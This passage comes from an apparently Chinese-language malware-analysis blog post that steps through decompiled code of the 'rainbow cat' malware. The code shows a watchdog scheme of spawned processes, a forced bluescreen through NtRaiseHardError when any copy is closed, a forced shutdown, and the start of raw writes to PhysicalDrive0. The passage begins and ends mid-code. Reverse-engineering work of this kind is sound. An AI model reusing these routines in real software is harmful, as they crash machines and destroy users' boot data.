class="string">L&quot;/watchdog&quot;</span>, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line">      --v11;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v11 );</span><br><span class="line">    pExecInfo.cbSize = <span class="number">60</span>;</span><br><span class="line">    pExecInfo.cbWndExtra = (<span class="type">int</span>)v10;</span><br><span class="line">    pExecInfo.hInstance = (HINSTANCE)<span class="string">L&quot;/main&quot;</span>;</span><br><span class="line">    pExecInfo.style = <span class="number">64</span>;</span><br><span class="line">    pExecInfo.lpfnWndProc = <span class="number">0</span>;</span><br><span class="line">    pExecInfo.cbClsExtra = <span class="number">0</span>;</span><br><span class="line">    pExecInfo.hIcon = <span class="number">0</span>;</span><br><span class="line">    pExecInfo.hbrBackground = <span class="number">0</span>;</span><br><span class="line">    pExecInfo.hCursor = (HCURSOR)<span class="number">10</span>;</span><br><span class="line">    <span class="built_in">ShellExecuteExW</span>((SHELLEXECUTEINFOW *)&amp;pExecInfo);</span><br><span class="line">    <span class="built_in">SetPriorityClass</span>(pExecInfo_56, <span class="number">0x80</span>u);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">ExitProcess</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现它是先弹了两个框：</p><p><img src="/%E5%BD%A9%E8%99%B9%E7%8C%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/1719749400140.png" alt="1719749400140"></p><p><img src="/%E5%BD%A9%E8%99%B9%E7%8C%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/1719749406670.png" alt="1719749406670"></p><p>告诉你启动这个病毒的后果（怪好心的😂）</p><p>这一句就是获取彩虹猫的系统路径，方便后续自启动</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v10 = (WCHAR *)<span class="built_in">LocalAlloc</span>(<span class="number">0x40</span>u, <span class="number">0x4000</span>u);</span><br><span class="line"><span class="built_in">GetModuleFileNameW</span>(<span class="number">0</span>, v10, <span class="number">0x2000</span>u);</span><br></pre></td></tr></table></figure><p>连续启动五个彩虹猫进程，参数设置为watchdog</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">v11 = <span class="number">5</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">ShellExecuteW</span>(<span class="number">0</span>, <span class="number">0</span>, v10, <span class="string">L&quot;/watchdog&quot;</span>, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line">    --v11;</span><br><span class="line">&#125;<span class="keyword">while</span> ( v11 );</span><br></pre></td></tr></table></figure><p>这个再次起了一个彩虹猫进程，并且给的参数是main，并且调用了SetPriorityClass指定了优先级，cpu会给高于正常的优先级，优先响应带main参数的这个彩虹猫程序</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pExecInfo.cbSize = <span class="number">60</span>;</span><br><span class="line">pExecInfo.lpFile = v10;</span><br><span class="line">pExecInfo.lpParameters = <span class="string">L&quot;/main&quot;</span>;</span><br><span class="line">pExecInfo.fMask = <span class="number">64</span>;</span><br><span class="line">pExecInfo.hwnd = <span class="number">0</span>;</span><br><span class="line">pExecInfo.lpVerb = <span class="number">0</span>;</span><br><span class="line">pExecInfo.lpDirectory = <span class="number">0</span>;</span><br><span class="line">pExecInfo.hInstApp = <span class="number">0</span>;</span><br><span class="line">pExecInfo.nShow = <span class="number">10</span>;</span><br><span class="line"><span class="built_in">ShellExecuteExW</span>(&amp;pExecInfo);</span><br><span class="line"><span class="built_in">SetPriorityClass</span>(pExecInfo.hProcess, <span class="number">0x80</span>u);</span><br></pre></td></tr></table></figure><blockquote><p>SetPriorityClass第二个参数指定优先级</p><p>指定进程的优先级类别。它可以是以下值之一：</p><ul><li><code>IDLE_PRIORITY_CLASS (0x40)</code>：空闲优先级类，只有当系统空闲时，进程才会获得 CPU 时间。</li><li><code>BELOW_NORMAL_PRIORITY_CLASS (0x4000)</code>：低于正常的优先级类。</li><li><code>NORMAL_PRIORITY_CLASS (0x20)</code>：正常优先级类，这是大多数应用程序的默认优先级。</li><li><code>ABOVE_NORMAL_PRIORITY_CLASS (0x8000)</code>：高于正常的优先级类。</li><li><code>HIGH_PRIORITY_CLASS (0x80)</code>：高优先级类，操作系统将更多的处理器时间分配给该类进程。应谨慎使用，因为它可能会影响系统的响应能力。</li><li><code>REALTIME_PRIORITY_CLASS (0x100)</code>：实时优先级类，获取几乎所有可用的处理器时间片。应极度谨慎使用，通常用于时间关键的任务，因为它会影响系统的整体性能和响应能力。</li></ul></blockquote><p>开启这6个子进程后，调用了ExitProcess终结了自己（母体释放完子体后，母体自杀）</p><p>后续我们来分析下具体这参数 watchdog 和 main 分别代表啥</p><h3 id="watchdog部分"><a href="#watchdog部分" class="headerlink" title="watchdog部分"></a>watchdog部分</h3><p><img src="/%E5%BD%A9%E8%99%B9%E7%8C%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/1719750294578.png" alt="1719750294578"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !<span class="built_in">lstrcmpW</span>(v1[<span class="number">1</span>], <span class="string">L&quot;/watchdog&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">CreateThread</span>(<span class="number">0</span>, <span class="number">0</span>, Thread_func1, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">      pExecInfo.cbClsExtra = <span class="number">0x30</span>;</span><br><span class="line">      pExecInfo.hInstance = (HINSTANCE)sub_401000;</span><br><span class="line">      pExecInfo_52 = <span class="string">&quot;hax&quot;</span>;</span><br><span class="line">      pExecInfo.cbWndExtra = <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">memset</span>(&amp;pExecInfo.hIcon, <span class="number">0</span>, <span class="number">24</span>);</span><br><span class="line">      pExecInfo_48 = <span class="number">0</span>;</span><br><span class="line">      pExecInfo_56 = <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">RegisterClassExA</span>((<span class="type">const</span> WNDCLASSEXA *)&amp;pExecInfo.cbClsExtra);</span><br><span class="line">      <span class="built_in">CreateWindowExA</span>(<span class="number">0</span>, <span class="string">&quot;hax&quot;</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">100</span>, <span class="number">100</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">      <span class="keyword">while</span> ( <span class="built_in">GetMessageW</span>(&amp;Msg, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>) &gt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">TranslateMessage</span>(&amp;Msg);</span><br><span class="line">        <span class="built_in">DispatchMessageW</span>(&amp;Msg);</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p>开局起了一个线程：Thread_func1，进去看看这个回调是干啥的</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">CreateThread</span>(<span class="number">0</span>, <span class="number">0</span>, Thread_func1, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p><img src="/%E5%BD%A9%E8%99%B9%E7%8C%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/1719750804217.png" alt="1719750804217"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __stdcall __noreturn <span class="title">Thread_func1</span><span class="params">(LPVOID lpThreadParameter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  HANDLE CurrentProcess; <span class="comment">// eax</span></span><br><span class="line">  HANDLE Toolhelp32Snapshot; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">const</span> CHAR *v3; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// esi</span></span><br><span class="line">  PROCESSENTRY32W pe; <span class="comment">// [esp+Ch] [ebp-23Ch] BYREF</span></span><br><span class="line">  LPCSTR Current_Path; <span class="comment">// [esp+238h] [ebp-10h]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [esp+23Ch] [ebp-Ch]</span></span><br><span class="line">  LPCSTR Temp_Path; <span class="comment">// [esp+240h] [ebp-8h]</span></span><br><span class="line">  HANDLE hObject; <span class="comment">// [esp+244h] [ebp-4h]</span></span><br><span class="line">  <span class="type">int</span> savedregs; <span class="comment">// [esp+248h] [ebp+0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  Current_Path = (LPCSTR)<span class="built_in">LocalAlloc</span>(<span class="number">0x40</span>u, <span class="number">0x200</span>u);<span class="comment">// LocalAlloc(LMEM_ZEROINIT,0x20)  分配0x20的空间并赋值为0</span></span><br><span class="line">  CurrentProcess = <span class="built_in">GetCurrentProcess</span>();         <span class="comment">// 获取当前进程的伪句柄</span></span><br><span class="line">  <span class="built_in">GetProcessImageFileNameA</span>(CurrentProcess, Current_Path, <span class="number">512</span>);<span class="comment">// GetProcessImageFileName 是一个 Windows API 函数，用于获取指定进程的可执行文件的路径。该函数返回的路径是系统路径</span></span><br><span class="line">  <span class="built_in">Sleep</span>(<span class="number">1000u</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    Toolhelp32Snapshot = <span class="built_in">CreateToolhelp32Snapshot</span>(<span class="number">2u</span>, <span class="number">0</span>);<span class="comment">// CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0) 是一个 Windows API 函数，用于创建系统快照，包含指定进程、线程、模块以及进程的堆列表。这对于枚举系统中的各类资源非常有用，例如获取当前运行的进程列表或某个进程中的所有模块。</span></span><br><span class="line">    pe.dwSize = <span class="number">556</span>;                            <span class="comment">// sizeof(PROCESSENTRY32)</span></span><br><span class="line">    <span class="built_in">Process32FirstW</span>(Toolhelp32Snapshot, &amp;pe);   <span class="comment">// Process32FirstW 是一个 Windows API 函数，用于检索系统快照中的第一个进程信息。</span></span><br><span class="line">    v3 = Current_Path;</span><br><span class="line">    v4 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      hObject = <span class="built_in">OpenProcess</span>(<span class="number">0x400</span>u, <span class="number">0</span>, pe.th32ProcessID);<span class="comment">// 0x400 PROCESS_QUERY_INFORMATION 代表允许查询进程的信息。</span></span><br><span class="line">      Temp_Path = (LPCSTR)<span class="built_in">LocalAlloc</span>(<span class="number">0x40</span>u, <span class="number">0x200</span>u);</span><br><span class="line">      <span class="built_in">GetProcessImageFileNameA</span>(hObject, Temp_Path, <span class="number">512</span>);<span class="comment">// 获取进程对应的路径</span></span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">lstrcmpA</span>(v3, Temp_Path) )           <span class="comment">// 获取到一共起了多少个一样的进程</span></span><br><span class="line">        ++v4;</span><br><span class="line">      <span class="built_in">CloseHandle</span>(hObject);</span><br><span class="line">      <span class="built_in">LocalFree</span>((HLOCAL)Temp_Path);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="built_in">Process32NextW</span>(Toolhelp32Snapshot, &amp;pe) );</span><br><span class="line">    <span class="built_in">CloseHandle</span>(Toolhelp32Snapshot);</span><br><span class="line">    <span class="keyword">if</span> ( v4 &lt; v7 )                              <span class="comment">// 如果关闭掉任意一个线程的话，直接调用</span></span><br><span class="line">      <span class="built_in">Destroy_windows</span>((<span class="type">int</span>)&amp;savedregs);</span><br><span class="line">    v7 = v4;</span><br><span class="line">    <span class="built_in">Sleep</span>(<span class="number">0xA</span>u);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一段就是典型的遍历进程，然后干大事</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    Toolhelp32Snapshot = <span class="built_in">CreateToolhelp32Snapshot</span>(<span class="number">2u</span>, <span class="number">0</span>);<span class="comment">// CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0) 是一个 Windows API 函数，用于创建系统快照，包含指定进程、线程、模块以及进程的堆列表。这对于枚举系统中的各类资源非常有用，例如获取当前运行的进程列表或某个进程中的所有模块。</span></span><br><span class="line">    pe.dwSize = <span class="number">556</span>;                            <span class="comment">// sizeof(PROCESSENTRY32)</span></span><br><span class="line">    <span class="built_in">Process32FirstW</span>(Toolhelp32Snapshot, &amp;pe);   <span class="comment">// Process32FirstW 是一个 Windows API 函数，用于检索系统快照中的第一个进程信息。</span></span><br><span class="line">    v3 = Current_Path;</span><br><span class="line">    v4 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      hObject = <span class="built_in">OpenProcess</span>(<span class="number">0x400</span>u, <span class="number">0</span>, pe.th32ProcessID);<span class="comment">// 0x400 PROCESS_QUERY_INFORMATION 代表允许查询进程的信息。</span></span><br><span class="line">      Temp_Path = (LPCSTR)<span class="built_in">LocalAlloc</span>(<span class="number">0x40</span>u, <span class="number">0x200</span>u);</span><br><span class="line">      <span class="built_in">GetProcessImageFileNameA</span>(hObject, Temp_Path, <span class="number">512</span>);<span class="comment">// 获取进程对应的路径</span></span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">lstrcmpA</span>(v3, Temp_Path) )           <span class="comment">// 获取到一共起了多少个一样的进程</span></span><br><span class="line">        ++v4;</span><br><span class="line">      <span class="built_in">CloseHandle</span>(hObject);</span><br><span class="line">      <span class="built_in">LocalFree</span>((HLOCAL)Temp_Path);</span><br><span class="line">    &#125;<span class="keyword">while</span> ( <span class="built_in">Process32NextW</span>(Toolhelp32Snapshot, &amp;pe) );</span><br><span class="line">     <span class="built_in">CloseHandle</span>(Toolhelp32Snapshot);</span><br><span class="line">    <span class="keyword">if</span> ( v4 &lt; v7 )                              <span class="comment">// 如果关闭掉任意一个线程的话，直接调用</span></span><br><span class="line">      <span class="built_in">Destroy_windows</span>((<span class="type">int</span>)&amp;savedregs);</span><br><span class="line">    v7 = v4;</span><br><span class="line">    <span class="built_in">Sleep</span>(<span class="number">0xA</span>u);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这里是去遍历一共有几个彩虹猫进程，把数量保存在V4中，和v7比（v7后续被赋值为v4）</p><p>一旦有一个进程被强行关闭，那么也会调用Destroy_windows.</p><p>继续分析：</p><p>发现注册了一个窗口，并且注册窗口过程函数为0x401000，跟进去看看：</p><p><img src="/%E5%BD%A9%E8%99%B9%E7%8C%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/1719750326910.png" alt="1719750326910"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LRESULT __stdcall <span class="title">sub_401000</span><span class="params">(HWND a1, UINT a2, WPARAM a3, LPARAM a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> savedregs; <span class="comment">// [esp+0h] [ebp+0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a2 != <span class="number">0x10</span> &amp;&amp; a2 != <span class="number">0x16</span> )               <span class="comment">// #define WM_CLOSE 0x0010                     </span></span><br><span class="line">                                                <span class="comment">// #define WM_ENDSESSION  0x0016</span></span><br><span class="line">    <span class="comment">// 反正就是关闭窗口就会触发蓝屏</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">DefWindowProcW</span>(a1, a2, a3, a4);</span><br><span class="line">  <span class="built_in">Destroy_windows</span>((<span class="type">int</span>)&amp;savedregs);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现窗口过程函数最单独处理WM_CLOSE和WM_ENDSESSION。所以只要 尝试关闭窗口 或者关闭系统 就会自动调用Destroy_windows函数</p><blockquote><p> <code>WM_ENDSESSION</code> 消息在系统关闭或用户注销时触发。这是系统广播给所有应用程序的一条消息，通知它们系统即将关闭或者用户会话即将结束。 </p></blockquote><p>点进去Destroy_windows</p><p><img src="/%E5%BD%A9%E8%99%B9%E7%8C%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/1719750340301.png" alt="1719750340301"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">BOOL __usercall Destroy_windows@&lt;eax&gt;(<span class="type">int</span> a1@&lt;ebp&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// esi</span></span><br><span class="line">  HMODULE LibraryA; <span class="comment">// edi</span></span><br><span class="line">  FARPROC RtlAdjustPrivilege; <span class="comment">// ebx</span></span><br><span class="line">  FARPROC NtRaiseHardError; <span class="comment">// eax</span></span><br><span class="line">  <span class="built_in">void</span> (__cdecl *v6)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); <span class="comment">// esi</span></span><br><span class="line">  HANDLE CurrentProcess; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [esp-20h] [ebp-28h]</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_TOKEN_PRIVILEGES</span> v10; <span class="comment">// [esp-18h] [ebp-20h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [esp-8h] [ebp-10h] BYREF</span></span><br><span class="line">  HANDLE v12; <span class="comment">// [esp-4h] [ebp-Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// [esp+0h] [ebp-8h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// [esp+4h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v1 = <span class="number">20</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">CreateThread</span>(<span class="number">0</span>, <span class="number">0x1000</span>u, StartAddress, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">Sleep</span>(<span class="number">0x64</span>u);</span><br><span class="line">    --v1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v1 );</span><br><span class="line">  v2 = v14;</span><br><span class="line">  v14 = a1;</span><br><span class="line">  v9 = v2;</span><br><span class="line">  LibraryA = <span class="built_in">LoadLibraryA</span>(<span class="string">&quot;ntdll&quot;</span>);             <span class="comment">// </span></span><br><span class="line">                                                <span class="comment">// RtlAdjustPrivilege 和 NtRaiseHardError 都是 Windows 操作系统内部函数，通常用于系统级编程或黑客技术。</span></span><br><span class="line">  RtlAdjustPrivilege = <span class="built_in">GetProcAddress</span>(LibraryA, <span class="string">&quot;RtlAdjustPrivilege&quot;</span>);<span class="comment">// RtlAdjustPrivilege 函数用于调整当前进程或线程的权限。具体来说，它允许调用者启用或禁用特定的权限。</span></span><br><span class="line">  NtRaiseHardError = <span class="built_in">GetProcAddress</span>(LibraryA, <span class="string">&quot;NtRaiseHardError&quot;</span>);<span class="comment">// NtRaiseHardError 函数用于引发硬错误（硬错误通常会导致系统崩溃或蓝屏）。该函数主要用于内核模式或调试目的。</span></span><br><span class="line">  v6 = (<span class="built_in">void</span> (__cdecl *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))NtRaiseHardError;</span><br><span class="line">  <span class="keyword">if</span> ( RtlAdjustPrivilege &amp;&amp; NtRaiseHardError )</span><br><span class="line">  &#123;</span><br><span class="line">    ((<span class="built_in">void</span> (__cdecl *)(<span class="type">int</span>, <span class="type">int</span>, _DWORD, <span class="type">char</span> *, <span class="type">int</span>, <span class="type">int</span>))RtlAdjustPrivilege)(<span class="number">19</span>, <span class="number">1</span>, <span class="number">0</span>, (<span class="type">char</span> *)&amp;v13 + <span class="number">3</span>, v13, v9);</span><br><span class="line">    <span class="built_in">v6</span>(<span class="number">-1073741790</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">6</span>, &amp;v11);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 获取当前进程的访问令牌。</span></span><br><span class="line">  <span class="comment">// 启用 SeShutdownPrivilege 权限，使进程有权进行系统关机操作。</span></span><br><span class="line">  <span class="comment">// 调用 ExitWindowsEx 函数来关机并强制所有应用程序关闭。</span></span><br><span class="line">  CurrentProcess = <span class="built_in">GetCurrentProcess</span>();</span><br><span class="line">  <span class="built_in">OpenProcessToken</span>(CurrentProcess, <span class="number">0x28</span>u, &amp;v12);</span><br><span class="line">  <span class="built_in">LookupPrivilegeValueW</span>(<span class="number">0</span>, <span class="string">L&quot;SeShutdownPrivilege&quot;</span>, &amp;v10.Privileges[<span class="number">0</span>].Luid);</span><br><span class="line">  v10.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">  v10.Privileges[<span class="number">0</span>].Attributes = <span class="number">2</span>;</span><br><span class="line">  <span class="built_in">AdjustTokenPrivileges</span>(v12, <span class="number">0</span>, &amp;v10, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">ExitWindowsEx</span>(<span class="number">6u</span>, <span class="number">0x10007</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>RtlAdjustPrivilege 函数用于调整当前进程或线程的权限。具体来说，它允许调用者启用或禁用特定的权限。</p><p>NtRaiseHardError 函数用于引发硬错误（硬错误通常会导致系统崩溃或蓝屏）。该函数主要用于内核模式或调试目的。</p><p>后续的操作：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CurrentProcess = <span class="built_in">GetCurrentProcess</span>();</span><br><span class="line"><span class="built_in">OpenProcessToken</span>(CurrentProcess, <span class="number">0x28</span>u, &amp;v12);</span><br><span class="line"><span class="built_in">LookupPrivilegeValueW</span>(<span class="number">0</span>, <span class="string">L&quot;SeShutdownPrivilege&quot;</span>, &amp;v10.Privileges[<span class="number">0</span>].Luid);</span><br><span class="line">v10.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">v10.Privileges[<span class="number">0</span>].Attributes = <span class="number">2</span>;</span><br><span class="line"><span class="built_in">AdjustTokenPrivileges</span>(v12, <span class="number">0</span>, &amp;v10, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>是为了获取当前进程的访问令牌。得到 SeShutdownPrivilege 权限，使进程有权进行系统关机操作。调用 ExitWindowsEx 函数来关机并强制所有应用程序关闭。（极度恶意）</p><h3 id="main部分："><a href="#main部分：" class="headerlink" title="main部分："></a>main部分：</h3><p><img src="/%E5%BD%A9%E8%99%B9%E7%8C%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/1719751337323.png" alt="1719751337323"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">// 这是参数为main开始的地方</span></span><br><span class="line">  FileA = <span class="built_in">CreateFileA</span>(<span class="string">&quot;\\\\.\\PhysicalDrive0&quot;</span>, <span class="number">0xC0000000</span>, <span class="number">3u</span>, <span class="number">0</span>, <span class="number">3u</span>, <span class="number">0</span>, <span class="number">0</span>);<span class="comment">// CreateFileA 函数中使用 &quot;\\\\.\\PhysicalDrive0&quot; 作为文件名参数，这实际上并不是在创建文件，而是打开一个特殊的系统设备——物理磁盘驱动器0。</span></span><br><span class="line">  hObject = FileA;</span><br><span class="line">  <span class="keyword">if</span> ( FileA == (HANDLE)<span class="number">-1</span> )</span><br><span class="line">    <span class="built_in">ExitProcess</span>(<span class="number">2u</span>);</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  v4 = <span class="built_in">LocalAlloc</span>(<span class="number">0x40</span>u, <span class="number">0x10000</span>u);</span><br><span class="line">  v5 = v4;</span><br><span class="line">  <span class="keyword">do</span>                                          <span class="comment">// 第一个参数 0x40u 是标志位，表示分配固定大小的内存块（LPTR，即 LMEM_FIXED | LMEM_ZEROINIT），并将分配的内存初始化为零。</span></span><br><span class="line">  &#123;</span><br><span class="line">    ++v3;</span><br><span class="line">    *v5 = v5[byte_402118 - v4];               <span class="comment">// 这个干啥的没看懂，我觉得是随机数？？</span></span><br><span class="line">    ++v5;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> 